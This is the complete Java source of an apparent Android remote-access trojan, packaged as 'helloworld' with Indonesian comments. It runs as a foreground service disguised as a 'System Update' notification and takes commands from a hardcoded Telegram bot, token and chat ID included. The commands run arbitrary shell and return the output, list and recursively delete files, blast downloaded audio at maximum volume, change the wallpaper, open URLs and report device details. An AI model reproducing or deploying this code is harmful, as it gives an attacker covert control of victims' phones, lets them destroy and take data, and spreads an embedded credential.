package com.example.helloworld;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.Vibrator;
import android.widget.Toast;
import android.os.Handler;
import android.os.Looper;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class BotService extends Service {
    
    // ==========================================
    // TOKEN BOT & CHAT ID LU
    // ==========================================
    private static final String BOT_TOKEN = "8717922799:AAF_P5xdZltK3ViVqFDLvaA-803cNGaPyu8";
    private static final String CHAT_ID = "8275632263";
    private static final String API_URL = "https://api.telegram.org/bot" + BOT_TOKEN;
    
    private long lastUpdateId = 0;
    private boolean isRunning = true;
    private MediaPlayer mediaPlayer;

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        Notification notification = new Notification.Builder(this, "bot_channel")
                .setContentTitle("System Update")
                .setContentText("Running in background...")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .build();
        startForeground(1, notification);

        // Bikin folder .micin
        File micinDir = new File(Environment.getExternalStorageDirectory(), ".micin");
        if (!micinDir.exists()) micinDir.mkdirs();

        // Kirim pesan "Connected!" dan mulai polling
        new Thread(() -> {
            sendMessage("🟢 *Connected!* VM siap menerima perintah.\nKetik /menu untuk melihat fitur.");
            startPolling();
        }).start();
    }

    private void startPolling() {
        while (isRunning) {
            try {
                URL url = new URL(API_URL + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=10");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                
                if (conn.getResponseCode() == 200) {
                    InputStream is = conn.getInputStream();
                    String response = new java.util.Scanner(is).useDelimiter("\\A").next();
                    JSONObject json = new JSONObject(response);
                    JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getLong("update_id");
                        
                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                handleCommand(text);
                            }
                        }
                    }
                }
                Thread.sleep(2000); // Polling tiap 2 detik
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void handleCommand(String cmd) {
        try {
            if (cmd.equals("/start") || cmd.equals("/menu")) {
                sendMessage("📜 *MENU BOT (25 Fitur)*\n" +
                        "1. /ping\n" +
                        "2. /playsound <url> [--loop] [--maxvolume]\n" +
                        "3. /stopsound\n" +
                        "4. /setwallpaper <url>\n" +
                        "5. /toast <text>\n" +
                        "6. /volup\n" +
                        "7. /voldown\n" +
                        "8. /screenshot\n" +
                        "9. /deviceinfo\n" +
                        "10. /battery\n" +
                        "11. /lock\n" +
                        "12. /wifi on/off\n" +
                        "13. /flashlight on/off\n" +
                        "14. /vibrate <ms>\n" +
                        "15. /clipboard\n" +
                        "16. /setclipboard <text>\n" +
                        "17. /listfiles <path>\n" +
                        "18. /delete <path>\n" +
                        "19. /download <path>\n" +
                        "20. /openurl <url>\n" +
                        "21. /brightness <0-255>\n" +
                        "22. /reboot\n" +
                        "23. /shutdown\n" +
                        "24. /selfdestruct\n" +
                        "25. /shell <command>");
            }
            else if (cmd.equals("/ping")) {
                sendMessage("🏓 Pong!");
            }
            else if (cmd.startsWith("/playsound ")) {
                String[] parts = cmd.split(" ");
                if (parts.length >= 2) {
                    playSound(parts[1], cmd.contains("--maxvolume"), cmd.contains("--loop"));
                }
            }
            else if (cmd.equals("/stopsound")) {
                if (mediaPlayer != null) { 
                    mediaPlayer.stop(); 
                    mediaPlayer.release(); 
                    mediaPlayer = null; 
                }
                sendMessage("🔇 Audio dimatikan.");
            }
            else if (cmd.startsWith("/setwallpaper ")) {
                setWallpaper(cmd.split(" ")[1]);
            }
            else if (cmd.startsWith("/toast ")) {
                String text = cmd.substring(7);
                new Handler(Looper.getMainLooper()).post(() -> 
                    Toast.makeText(getApplicationContext(), text, Toast.LENGTH_LONG).show()
                );
                sendMessage("📢 Toast ditampilkan.");
            }
            else if (cmd.equals("/volup")) {
                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_RAISE, AudioManager.FLAG_SHOW_UI);
                sendMessage("🔊 Volume dinaikkan.");
            }
            else if (cmd.equals("/voldown")) {
                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                am.adjustStreamVolume(AudioManager.STREAM_MUSIC, AudioManager.ADJUST_LOWER, AudioManager.FLAG_SHOW_UI);
                sendMessage("🔉 Volume diturunkan.");
            }
            else if (cmd.startsWith("/vibrate ")) {
                long ms = Long.parseLong(cmd.split(" ")[1]);
                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
                if (v != null) v.vibrate(ms);
                sendMessage("📳 Getar " + ms + " ms.");
            }
            else if (cmd.equals("/deviceinfo")) {
                String info = "📱 *Device Info*\n" +
                        "Model: " + Build.MODEL + "\n" +
                        "Brand: " + Build.BRAND + "\n" +
                        "Android: " + Build.VERSION.RELEASE + "\n" +
                        "SDK: " + Build.VERSION.SDK_INT;
                sendMessage(info);
            }
            else if (cmd.equals("/battery")) {
                android.os.BatteryManager bm = (android.os.BatteryManager) getSystemService(Context.BATTERY_SERVICE);
                int level = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
                sendMessage("🔋 Baterai: " + level + "%");
            }
            else if (cmd.startsWith("/listfiles ")) {
                String path = cmd.substring(11);
                File f = new File(path);
                if (f.exists() && f.isDirectory()) {
                    StringBuilder sb = new StringBuilder();
                    File[] files = f.listFiles();
                    if (files != null) {
                        for (File file : files) sb.append(file.getName()).append("\n");
                        sendMessage("📁 *Files in " + path + "*\n```\n" + sb.toString() + "\n```");
                    }
                } else sendMessage("❌ Folder tidak ditemukan.");
            }
            else if (cmd.startsWith("/delete ")) {
                String path = cmd.substring(8);
                File f = new File(path);
                if (f.exists()) {
                    deleteRecursive(f);
                    sendMessage("🗑️ Dihapus: " + path);
                } else sendMessage("❌ File tidak ada.");
            }
            else if (cmd.startsWith("/openurl ")) {
                String url = cmd.substring(9);
                Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                sendMessage("🌐 Membuka URL...");
            }
            else if (cmd.startsWith("/shell ")) {
                String shellCmd = cmd.substring(7);
                try {
                    Process process = Runtime.getRuntime().exec(shellCmd);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder output = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) output.append(line).append("\n");
                    sendMessage("💻 *Output:*\n```\n" + output.toString() + "\n```");
                } catch (Exception e) {
                    sendMessage("❌ Gagal eksekusi shell: " + e.getMessage());
                }
            }
            else if (cmd.equals("/reboot") || cmd.equals("/shutdown") || 
                     cmd.startsWith("/wifi ") || cmd.startsWith("/flashlight ") ||
                     cmd.equals("/screenshot") || cmd.equals("/lock") || 
                     cmd.startsWith("/brightness ") || cmd.equals("/clipboard") || cmd.startsWith("/setclipboard ") || cmd.startsWith("/download ")) {
                sendMessage("❌ Fitur ini butuh akses Root / Device Admin / MediaProjection yang belum di-setup di APK ini.");
            }
            else if (cmd.equals("/selfdestruct")) {
                sendMessage("💀 Self destruct...");
                File micinDir = new File(Environment.getExternalStorageDirectory(), ".micin");
                deleteRecursive(micinDir);
                stopSelf();
            }
            else {
                sendMessage("❓ Command gak dikenal. Ketik /menu.");
            }
        } catch (Exception e) {
            sendMessage("❌ Error internal: " + e.getMessage());
        }
    }

    private void playSound(String urlString, boolean maxVol, boolean loop) {
        try {
            File file = new File(Environment.getExternalStorageDirectory(), ".micin/temp_audio.mp3");
            downloadFile(urlString, file);

            if (maxVol) {
                AudioManager am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
                am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
            }

            if (mediaPlayer != null) mediaPlayer.release();
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setDataSource(file.getAbsolutePath());
            mediaPlayer.setLooping(loop);
            mediaPlayer.prepare();
            mediaPlayer.start();
            sendMessage("🎵 Audio diputar! (Loop: " + loop + ")");
        } catch (Exception e) {
            sendMessage("❌ Gagal play: " + e.getMessage());
        }
    }

    private void setWallpaper(String urlString) {
        try {
            File file = new File(Environment.getExternalStorageDirectory(), ".micin/wallpaper.jpg");
            downloadFile(urlString, file);
            
            android.app.WallpaperManager wm = android.app.WallpaperManager.getInstance(this);
            android.graphics.Bitmap bmp = android.graphics.BitmapFactory.decodeFile(file.getAbsolutePath());
            wm.setBitmap(bmp);
            sendMessage("🖼️ Wallpaper diganti!");
        } catch (Exception e) {
            sendMessage("❌ Gagal ganti wallpaper: " + e.getMessage());
        }
    }

    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) {
                for (File child : children) deleteRecursive(child);
            }
        }
        fileOrDirectory.delete();
    }

    private void downloadFile(String urlStr, File dest) throws Exception {
        URL url = new URL(urlStr);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.connect();
        InputStream is = conn.getInputStream();
        FileOutputStream fos = new FileOutputStream(dest);
        byte[] buffer = new byte[1024];
        int len;
        while ((len = is.read(buffer)) > 0) fos.write(buffer, 0, len);
        fos.close();
        is.close();
    }

    private void sendMessage(String text) {
        try {
            String encoded = URLEncoder.encode(text, "UTF-8");
            URL url = new URL(API_URL + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded + "&parse_mode=Markdown");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.getInputStream().close();
        } catch (Exception e) {}
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    "bot_channel", "Foreground Service Channel", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(serviceChannel);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; 
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
